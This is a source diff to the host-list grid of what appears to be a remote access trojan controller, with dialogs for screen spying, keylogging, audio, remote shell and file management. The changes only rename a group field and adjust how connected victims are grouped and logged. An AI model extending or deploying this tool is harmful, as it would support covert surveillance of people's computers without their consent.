@@ -5,7 +5,7 @@
 
 #include "MySuperGrid.h"
 #include "MainFrm.h"
-#include "122205622.h"
+
 #include "FileManagerDlg.h"
 #include "ScreenSpyDlg.h"
 #include "KeyBoardDlg.h"
@@ -13,6 +13,7 @@
 #include "AudioDlg.h"
 #include "SystemDlg.h"
 #include "ShellDlg.h"
+#include "122205622.h"
 
 #include "ServiceDlg.h"
 #include "LogView.h"
@@ -151,6 +152,7 @@ void CMySuperGrid::SelAllOnGroup(UINT nTree)
 void CMySuperGrid::NewGroup(CString strGroupName)
 {
 	CItemInfo *lp = new CItemInfo;
+
 	lp->SetImage(4);
 	lp->SetItemText(strGroupName);
 	InsertRootItem(lp);
@@ -195,7 +197,7 @@ void CMySuperGrid::ChangeGroup(CString strGroupName)
 		
 		InsertItem(pRoot, pItem, TRUE);
 		DeleteItemEx(pTree, pTree->m_nIndex);
-		UpGroupNum(LoginInfo->UpGroup);
+		UpGroupNum(LoginInfo->szUpGroup);
 		
 		//		ClientContext* pNewContext = NULL;// = (ClientContext *)pItem->MyGetItemDate();
 		lstrcpy(pContext->m_group, strGroupName);
@@ -218,22 +220,29 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
 		CString	str;
 		CItemInfo* lp = new CItemInfo();
-		lp->SetImage(4);
+		lp->SetImage(1);
 		//add item text
 		
-		if (lstrlen(LoginInfo->UpGroup) != NULL)
-		{
-			lstrcpy(pContext->m_group, LoginInfo->UpGroup);
-		}
-		else
-		{
-			lstrcpy(pContext->m_group, "Default");
-			/*		CString Test;
-			Test.Format("%d", GetTickCount());
-			lstrcpy(pContext->m_group, Test);*/
-		}
+		//if (lstrlen(LoginInfo->UpGroup) != NULL)
+		//{
+		//	lstrcpy(pContext->m_group, LoginInfo->UpGroup);
+		//}
+		//else
+		//{
+		//	AfxMessageBox(LoginInfo->UpGroup);
+		//	lstrcpy(pContext->m_group, "Default");
+		//	/*		CString Test;
+		//	Test.Format("%d", GetTickCount());
+		//	lstrcpy(pContext->m_group, Test);*/
+		//}
+
+
+		lstrcpy(pContext->m_group, LoginInfo->szUpGroup);
 		str.Format("(0)%s", pContext->m_group);
 		lp->SetItemText(str);
+
+
+
 		CTreeItem *pRoot = NULL;
 		CTreeItem *pFindRoot = GroupSearch(pContext->m_group, NULL);
 		if (pFindRoot != NULL)
@@ -484,7 +493,7 @@ LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
 		
 		InsertItem(pRoot, lpItemInfo, TRUE);
 		//g_pFrame->UpCount();
-		UpGroupNum(LoginInfo->UpGroup);
+		UpGroupNum(LoginInfo->szUpGroup);
 		str.Format("上线 %s		所属分组【%s】", IPAddress, pContext->m_group);
 		g_pLogView->InsertLogItem(str, 0, 1);
 		//g_pLogView->AddToLog(str);
@@ -1924,7 +1933,7 @@ void CMySuperGrid::DisConnect()
 		DeleteItemEx(pTree, pTree->m_nIndex);
 		g_pFrame->m_nUpCount--;
 		if (pContext)
-			UpGroupNum(LoginInfo->UpGroup);
+			UpGroupNum(LoginInfo->szUpGroup);
 		switch (pContext->m_Dialog[0])
 		{
 		case FILEMANAGER_DLG:
@@ -2104,7 +2113,7 @@ LRESULT CMySuperGrid::OnFindYES(WPARAM wParam, LPARAM lParam)
 {	
 	ClientContext	*pContext = (ClientContext *)lParam;
 	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
-	CTreeItem *pFindRoot = GroupSearch(LoginInfo->UpGroup, NULL);
+	CTreeItem *pFindRoot = GroupSearch(LoginInfo->szUpGroup, NULL);
 	if (pFindRoot == NULL)
 		return -1;
 	int nCount = NumChildren(pFindRoot);
@@ -2164,7 +2173,7 @@ LRESULT CMySuperGrid::OnFindNO(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext	*pContext = (ClientContext *)lParam;
 	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
-	CTreeItem *pFindRoot = GroupSearch(LoginInfo->UpGroup, NULL);
+	CTreeItem *pFindRoot = GroupSearch(LoginInfo->szUpGroup, NULL);
 	if (pFindRoot == NULL)
 		return -1;
 	int nCount = NumChildren(pFindRoot);
